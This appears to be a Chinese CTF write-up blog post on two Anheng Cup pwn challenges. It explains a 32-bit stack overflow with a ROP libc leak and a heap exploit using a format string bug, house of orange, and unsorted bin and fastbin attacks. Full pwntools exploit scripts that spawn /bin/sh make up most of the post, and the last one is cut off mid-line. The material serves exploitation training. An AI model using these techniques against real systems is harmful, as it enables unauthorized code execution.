@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,ctf,house of orange,unsorted bin attack," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="题目链接messageb0x 教科书般的32位栈溢出(不懂得可以看一步一步学rop 32位)，首先rop利用puts函数泄漏puts真实地址得到libc基址，然后得到system地址，/bin/sh地址再rop到有溢出地方执行system(‘/bin/sh\x00’)  exp: 12345678910111213141516171819202122232425262728293031323334">
+<meta name="keywords" content="pwn,ctf,house of orange,unsorted bin attack">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒杯12月月赛 (pwn)">
+<meta property="og:url" content="http://yoursite.com/2018/12/26/安恒杯12月月赛-pwn/index.html">
+<meta property="og:site_name" content="1mpossible">
+<meta property="og:description" content="题目链接messageb0x 教科书般的32位栈溢出(不懂得可以看一步一步学rop 32位)，首先rop利用puts函数泄漏puts真实地址得到libc基址，然后得到system地址，/bin/sh地址再rop到有溢出地方执行system(‘/bin/sh\x00’)  exp: 12345678910111213141516171819202122232425262728293031323334">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-1c5f828bd35aa7aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-26T08:13:20.843Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安恒杯12月月赛 (pwn)">
+<meta name="twitter:description" content="题目链接messageb0x 教科书般的32位栈溢出(不懂得可以看一步一步学rop 32位)，首先rop利用puts函数泄漏puts真实地址得到libc基址，然后得到system地址，/bin/sh地址再rop到有溢出地方执行system(‘/bin/sh\x00’)  exp: 12345678910111213141516171819202122232425262728293031323334">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5808046-1c5f828bd35aa7aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/26/安恒杯12月月赛-pwn/"/>
+
+
+
+
+
+  <title>安恒杯12月月赛 (pwn) | 1mpossible</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?4e8a62468b73a2eaab4764496c434a66";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+<a href="https://github.com/hacker-mao" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">1mpossible</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/26/安恒杯12月月赛-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D4rk3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1mpossible">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">安恒杯12月月赛 (pwn)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-26T16:03:20+08:00">
+                2018-12-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/12/26/安恒杯12月月赛-pwn/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/12/26/安恒杯12月月赛-pwn/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/12/26/安恒杯12月月赛-pwn/" class="leancloud_visitors" data-flag-title="安恒杯12月月赛 (pwn)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.6k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a><a href="https://github.com/hacker-mao/ctf_repo/tree/master/%E5%AE%89%E6%81%92%E6%9D%AF/12%E6%9C%88%E6%9C%88%E8%B5%9B" target="_blank" rel="noopener">题目链接</a></h1><h1 id="messageb0x"><a href="#messageb0x" class="headerlink" title="messageb0x"></a>messageb0x</h1><ul>
+<li>教科书般的32位栈溢出(不懂得可以看一步一步学rop 32位)，首先rop利用puts函数泄漏puts真实地址得到libc基址，然后得到system地址，/bin/sh地址再rop到有溢出地方执行system(‘/bin/sh\x00’)</li>
+</ul>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./messageb0x&apos;)</span><br><span class="line">p = remote(&apos;101.71.29.5&apos;,10000)</span><br><span class="line"></span><br><span class="line">def stack_overflow(payload):</span><br><span class="line">	p.recvuntil(&apos; are:\n&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;address:\n&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;say:\n&apos;)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./messageb0x&apos;)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x58 + &apos;bbbb&apos; </span><br><span class="line">payload += p32(puts_plt) + p32(0x0804923B)</span><br><span class="line">payload += p32(puts_got)</span><br><span class="line">stack_overflow(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;you !\n&apos;)</span><br><span class="line">puts_addr = u32(p.recv(4))</span><br><span class="line">log.success(&apos;puts addr : 0x%x&apos;%puts_addr)</span><br><span class="line"># offset_puts = 0x0005fca0</span><br><span class="line"># offset_system = 0x0003ada0</span><br><span class="line"># offset_str_bin_sh = 0x15ba0b</span><br><span class="line">offset_puts = 0x0005f140</span><br><span class="line">offset_system = 0x0003a940</span><br><span class="line">offset_str_bin_sh = 0x15902b</span><br><span class="line">libc_base = puts_addr - offset_puts</span><br><span class="line">log.success(&apos;libc addr : 0x%x&apos;%libc_base)</span><br><span class="line">system_addr = libc_base + offset_system</span><br><span class="line">binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x58 + &apos;bbbb&apos;</span><br><span class="line">payload += p32(system_addr) + p32(0xdeadbeef)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">stack_overflow(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="smallorange"><a href="#smallorange" class="headerlink" title="smallorange"></a>smallorange</h1><ul>
+<li>这题感觉质量挺好的，让我学到了挺多骚操作的包括house_of_orange，一开始发现程序有个edit函数但是没有被调用，还以为作者搞错了(233333)，然后程序还有个格式化字符串漏洞，数组下界溢出(这题并没有利用到)</li>
+</ul>
+<ul>
+<li><strong><em>预期解</em></strong>(直接copy官方的wp):</li>
+</ul>
+<ol>
+<li>通过格式化字符串漏洞修改控制输入堆块数据大小的size变量，从而为后续构造堆溢出，并泄露栈地址。</li>
+<li>通过之前构造的size，可以触发堆溢出，但是由于题目逻辑限制，无法直接达到任意地址写。只能使用<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c" target="_blank" rel="noopener">the house of orange</a>(这里的demo写的很清晰)进行攻击。</li>
+<li>由于题目没有信息泄露的地方，唯一知道的是程序运行开始时打印的堆地址和泄露的栈地址，无法获得lib库加载的基地址，但是_IO_list_all变量与malloc 使用area变量相近，根据_IO_list_all变量的在lib库的偏移可以大致确定其加载地址，通过覆盖unsorted  bin的bk的两个字节，这样会有十六分之一的几率将bk覆盖为_IO_list_all-0x10,从而利用the house of orange 劫持控制流。</li>
+<li>劫持控制流后，由于无法获得system地址，则通过将rip设为edit函数，并将其参数设为栈地址，这样可以向栈中写入rop连，通过rop泄露puts函数地址，计算system地址，改atoi_got为system执行system(‘/bin/sh\x00’)</li>
+</ol>
+<p>exp1(本地关了aslr):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(argv=[&apos;./smallorange&apos;,&apos;a&apos;*0x1000])</span><br><span class="line">#p = process(&apos;./smallorange&apos;,env=&#123;&apos;123&apos;*0x1000:&apos;a&apos;*0x1000&#125;)</span><br><span class="line"></span><br><span class="line">def new(data):</span><br><span class="line">	p.recvuntil(&apos;choice: &apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;text:\n&apos;)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line">def out(index):</span><br><span class="line">	p.recvuntil(&apos;choice: &apos;)</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">#use fmt change size to heapoverflow and leak stack_addr</span><br><span class="line">p.recvuntil(&apos;ourselves\n&apos;)</span><br><span class="line">p.send(&apos;a&apos;*34 + &apos;a%19$n&apos;)</span><br><span class="line">p.recvuntil(&apos;a&apos;*35)</span><br><span class="line">leak_stack = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">p.recvuntil(&apos;addr:&apos;)</span><br><span class="line">leak_heap = int(p.recvuntil(&apos;\n&apos;,drop=True),16)</span><br><span class="line">log.success(&apos;leak stack addr : 0x%x&apos;%leak_stack)</span><br><span class="line">log.success(&apos;leak heap addr : 0x%x&apos;%leak_heap)</span><br><span class="line"></span><br><span class="line">#FSOP -&gt; edit(stack_addr)</span><br><span class="line">system_addr = 0x7ffff7a52390</span><br><span class="line">edit_addr = 0x400B59</span><br><span class="line">new(&apos;aaaa&apos;) #0</span><br><span class="line">#fake _IO_FILE</span><br><span class="line">fake_IO_file =  p64(0)*2 + p64(2) + p64(3) + p64(0)*9 </span><br><span class="line">fake_IO_file += p64(edit_addr)</span><br><span class="line">fake_IO_file += p64(0)*11 + p64(leak_heap+0x270)</span><br><span class="line">new(fake_IO_file) #1</span><br><span class="line">new(&apos;cccc&apos;) #2</span><br><span class="line">out(0)</span><br><span class="line">out(1)</span><br><span class="line">fake_unsorted_bin = &apos;a&apos;*0x100 + p64(leak_stack-0x569) + p64(0x61)</span><br><span class="line">fake_unsorted_bin += &apos;a&apos;*8 + &apos;\x10\x25&apos;</span><br><span class="line">new(fake_unsorted_bin) #3</span><br><span class="line">p.recvuntil(&apos;choice: &apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">#rop -&gt; write(1,puts_got,8) -&gt; read(0,atoi_got,8) -&gt; getnum</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">elf = ELF(&apos;./smallorange&apos;)</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">read_got = elf.got[&apos;read&apos;]</span><br><span class="line">atoi_got = elf.got[&apos;atoi&apos;]</span><br><span class="line">p6_ret = 0x400C9A</span><br><span class="line">mov_call = 0x400C80</span><br><span class="line">payload = &apos;a&apos;*48 + p64(p6_ret)</span><br><span class="line">payload += p64(0) + p64(1) + p64(write_got) + p64(0x8) + p64(puts_got) + p64(1)</span><br><span class="line">payload += p64(mov_call) + &apos;aaaaaaaa&apos;</span><br><span class="line">payload += p64(0) + p64(1) + p64(read_got) + p64(0x8) + p64(atoi_got) + p64(0)</span><br><span class="line">payload += p64(mov_call) + &apos;a&apos;*56 + p64(0x400AEA)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">puts_addr = u64(p.recv(8))</span><br><span class="line">log.success(&apos;puts addr : 0x%x&apos;%puts_addr)</span><br><span class="line">offset_puts = 0x000000000006f690</span><br><span class="line">offset_system = 0x0000000000045390</span><br><span class="line">libc_base = puts_addr - offset_puts</span><br><span class="line">system_addr = libc_base + offset_system</span><br><span class="line">log.success(&apos;system addr : 0x%x&apos;%system_addr)</span><br><span class="line"></span><br><span class="line">#system(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><em>非预期解</em></strong>(感谢veritas501师傅提供的思路以及耐心解答我的一些问题)：</li>
+</ul>
+<ol>
+<li>通过格式化字符串漏洞修改控制输入堆块数据大小的size变量，从而为后续构造堆溢出，并泄露栈地址。</li>
+<li>利用堆溢出，由于unsorted bin中bk指针是main_arena+0x58的地址，与global_max_fast只差2字节，所以利用unsorted bin attack来修改global_max_fast</li>
+<li>然后利用out函数的getnum在栈上fake fastbin，然后alloc to stack，进而stack overflow</li>
+<li>rop泄漏libc然后改atoi函数为system，跳转到getnum函数执行system(‘/bin/sh\x00’)</li>
+</ol>
+<p>有些细节需要注意：</p>
+<ol>
+<li>由于read函数的size太大，到达栈底，所以我们运行程序的时候需要加点argv或者env来扩大栈</li>
+<li>getnum函数的stack_chk_fail并没有被执行所以我们才能stack overflow</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-1c5f828bd35aa7aa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>exp2(本地关了aslr):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(argv=[&apos;./smallorange&apos;,&apos;a&apos;*0x1000])</span><br><span class="line">#p = process(&apos;./smallorange&apos;,env=&#123;&apos;123&apos;*0x1000:&apos;a&apos;*0x1000&#125;)</span><br><span class="line"></span><br><span class="line">def new(data):</span><br><span class="line">	p.recvuntil(&apos;choice: &apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;text:\n&apos;)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line">def out(index):</span><br><span class="line">	p.recvuntil(&apos;choice: &apos;)</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.recvuntil(&apos;index:\n&apos;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">#use fmt change size to heapoverflow and leak stack_addr</span><br><span class="line">p.recvuntil(&apos;ourselves\n&apos;)</span><br><span class="line">p.send(&apos;a&apos;*34 + &apos;a%19$n&apos;)</span><br><span class="line">p.recvuntil(&apos;a&apos;*35)</span><br><span class="line">leak_stack = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">p.recvuntil(&apos;addr:&apos;)</span><br><span class="line">leak_heap = int(p.recvuntil(&apos;\n&apos;,drop=True),16)</span><br><span class="line">log.success(&apos;leak stack addr : 0x%x&apos;%leak_stack)</span><br><span class="line">log.success(&apos;leak heap addr : 0x%x&apos;%leak_heap)</span><br><span class="line"></span><br><span class="line">#unsorted bin attack to hijack global_max_fast</span><br><span class="line">new(&apos;aaaa&apos;) #0</span><br><span class="line">new(&apos;bbbb&apos;) #1</span><br><span class="line">new(&apos;cccc&apos;) #2</span><br><span class="line">new(&apos;1&apos;) #3</span><br><span class="line">new(&apos;2&apos;) #4</span><br><span class="line">new(&apos;3&apos;) #5</span><br><span class="line">out(0)</span><br><span class="line">out(1)</span><br><span class="line">fake_unsorted_bin = &apos;a&apos;*0x100 + p64(0x110) + p64(0x111)</span><br><span class="line">fake_unsorted_bin += &apos;a&apos;*0x8 + &apos;\xe8\x37&apos;</span><br><span class="line">new(fake_unsorted_bin) #6</span><br><span class="line">new(&apos;dddd&apos;) #7</span><br><span class="line"></span><br><span class="line">#fastbin attack to alloc to Stack</span><br><span class="line">fake_chunk_ptr = leak_stack - 89 - 0x8</span><br><span class="line">log.success(&apos;fake_chunk_ptr : 0x%x&apos;%fake_chunk_ptr)</span><br><span class="line">out(4)</span><br><span class="line">out(3)</span><br><span class="line">payload = &apos;a&apos;*0x100 + p64(0) + p64(0x111)</span><br><span class="line">payload += p64(fake_chunk_ptr)</span><br><span class="line">new(payload)</span><br><span class="line">new(&apos;eeee&apos;)</span><br><span class="line">#fake chunk on stack</span><br><span class="line">out(p64(0x111))</span><br><span class="line">#rop </span><br><span class="line">elf = ELF(&apos;./smallorange&apos;)</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">read_got = elf.got[&apos;read&apos;]</span><br><span class="line">atoi_got = elf.got[&apos;atoi&apos;]</span><br><span class="line">p6_ret = 0x400C9A</span><br><span class="line">mov_call = 0x400C80</span><br><span class="line">payload = &apos;p&apos;*0x10 + p64(p6_ret)</span><br><span class="line">payload += p64(0) + p64(1) + p64(write_got) + p64(0x8) + p64(puts_got) + p64(1)</span><br><span class="line">payload += p64(mov_call) + &apos;aaaaaaaa&apos;</span><br><span class="line">payload += p64(0) + p64(1) + p64(read_got) + p64(0x8) + p64(atoi_got) + p64(0)</span><br><span class="line">payload += p64(mov_call) + &apos;a&apos;*56 + p64(0x400AEA)</span><br><span class="line">new(payload)</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">puts_addr = u64(p.recv(8))</span><br><span class="line">log.success(&apos;puts addr : 0x%x&apos;%puts_addr)</span><br><span class="line">offset_puts = 0x000000000006f690</span><br><span class="line">offset_system = 0x0000000000045390</span><br><span class="line">libc_base = puts_addr - 